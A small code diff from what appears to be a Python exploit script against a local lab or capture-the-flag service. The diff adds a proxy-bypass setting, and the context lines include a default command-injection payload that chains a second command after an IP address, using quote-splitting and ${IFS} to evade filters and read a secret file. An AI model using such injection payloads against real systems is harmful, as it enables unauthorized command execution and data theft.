@@ -12,6 +12,8 @@ from urllib.parse import quote
 
 import requests
 
+os.environ["NO_PROXY"] = "*"  # 防止代理污染：脚本只访问 127.0.0.1
+
 
 DEFAULT_URL = os.environ.get("GKD_URL") or ("http://127.0.0.1:33409/")
 DEFAULT_PAYLOAD = "127.0.0.1;c'a't${IFS}s3cr3t_out.txt"
